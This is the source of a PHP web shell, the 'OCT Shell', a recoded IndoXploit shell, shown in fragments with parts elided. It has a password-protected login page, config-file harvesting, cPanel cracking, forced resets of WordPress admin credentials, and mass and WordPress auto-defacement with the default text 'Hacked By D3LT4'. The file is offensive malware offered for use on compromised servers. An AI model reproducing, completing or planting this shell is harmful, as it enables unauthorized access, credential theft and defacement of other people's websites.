<?php
//OCT Shell
//IndoXploit Shell V1 Recoded By xLon3ly
//default password nya "lonely"
//Tutornya Cari Di Blog http://cr1p.blogspot.com 
@session_start(); 
@error_reporting(0); 
@error_log(0);
...
$lol="ee1cb21b36abc248944051f06ba5643b"; //password(md5)
function printLogin() { 
    ?> 
<html>
<head>
<title>__xLon3ly__</title>
<link href='http://file-store.obsidiancyberteam.id/logo.png' rel='icon' type='image/x-icon'/>
<meta name='author' content='D3LT4'>
<meta charset="UTF-8">
<style>
...
<center><img src="https://www.showincity.com/fileman/Uploads/Oct/PicsArt_08-07-12.33.25.png"><center>
<header>
<pre>
<center><div id=q> <br /><br /> <div class="jan"> <b> <font face="Architects Daughter" size="8" color="cyan"> ___xLon3ly___ </center> 
</pre>
    <style> 
...
<html>
<head>
<title>___xLon3ly___</title>
<link href='https://www.showincity.com/fileman/Uploads/Oct/PicsArt_08-07-12.33.25.png' rel='icon' type='image/x-icon'/>
...
body {
      	background-image:url('https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcTEvRxFgf6jPCJhF991w780CaLxDvs_1PQTNRPwtE2hYlR9tVTlqA');
...
echo "<li>[ <a href='?dir=$dir&do=jumping'>Lompat Indah</a> ]</li>";
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>OCT Shell<hr>IndoXploit Shell Recoded By D3LT4<br>For More Script Visit <a href="http://cr1p.blogspot.com/">Here</a>';
...
elseif($_GET['do'] == 'config') {
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='D3LT4' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='D3LT4' placeholder='pass_baru'><br>
...
echo "Shell [ <a href='./shells.txt' target='_blank'>shells.txt</a> ]</span>";
 ...
 elseif($_GET['do'] == 'cpanel') {
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By D3LT4' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='D3LT4'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Sukses Deface ".$i." Cpanel by <font color=lime>OCT.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
...
//
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By D3LT4' required><br>
...
</form>Copyright &copy; ".date("Y")." - <a href='http://forum.indoxploit.or.id/' target='_blank'><font color=lime>IndoXploit</font></a> Shell Recoded By <a href='http://fb.com/revanz.futra' target='_BLANK'><font color=lime>xLon3ly </a></font></center>";
?>
</html>
 xLon3ly was here..!!
